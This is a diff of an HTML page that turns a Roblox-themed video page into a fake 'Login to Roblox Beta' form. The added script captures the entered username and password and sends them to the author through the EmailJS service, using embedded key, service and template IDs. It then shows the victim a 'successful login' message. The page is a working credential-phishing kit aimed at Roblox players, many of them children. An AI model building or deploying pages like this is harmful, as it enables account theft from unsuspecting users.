@@ -1,50 +1,82 @@
+<!DOCTYPE html>
 <html lang="en">
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>Video Background</title> 
+<head>
+  <meta charset="UTF-8" />
+  <title>Login Page</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    #video-background {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      min-width: 100%;
-      min-height: 100%;
-      width: auto;
-      height: auto;
-      transform: translate(-50%, -50%);
-      z-index: -1000;
-      overflow: hidden;
-    }
-    #video-content {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+    body {
+      background-color: #111;
+      font-family: sans-serif;
       color: white;
-      text-align: center;
-      z-index: 1000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
     }
-  </style> 
- </head> 
- <body> 
-  <video autoplay muted playsinline id="video-background"> 
-   <source src="Latest roblox loading screen.mp4" type="video/mp4"> Your browser does not support the video tag. 
-  </video> 
-  <div id="video-content"> 
-   <!-- Konten tambahan di sini --> 
-  </div> 
-  <script>
-    // Redirect ke URL lain setelah 11 detik
-    setTimeout(function() {
-      window.location.href = "https://apkbr.github.io/yo.com/";
-    }, 11000); // 11000 ms = 11 detik
-  </script> 
- </body>
+    .login-box {
+      background: #1e1e1e;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px red;
+      width: 320px;
+    }
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+      background-color: #333;
+      color: white;
+    }
+    .button {
+      width: 100%;
+      padding: 10px;
+      background: linear-gradient(to bottom, #961e1e, #5a0a0a);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .notif {
+      margin-top: 15px;
+      font-size: 14px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h2>Login to Roblox Beta</h2>
+  <form id="login-form">
+    <input type="text" name="username" class="input" placeholder="Username" required />
+    <input type="password" name="password" class="input" placeholder="Password" required />
+    <button type="submit" class="button">Login</button>
+    <div class="notif" id="notif-box"></div>
+  </form>
+</div>
+
+<script>
+  emailjs.init('B7jGSz3WV1KNt1BYL'); // Public key kamu
+
+  document.getElementById("login-form").addEventListener("submit", function(event) {
+    event.preventDefault();
+    emailjs.sendForm('service_5eumoq7', 'template_jd36btb', this)
+      .then(function() {
+        document.getElementById("notif-box").innerText = "✅ successful login,Now check your Roblox account";
+      }, function(error) {
+        document.getElementById("notif-box").innerText = "❌ Failed to send: " + error.text;
+      });
+  });
+</script>
+
+</body>
 </html>
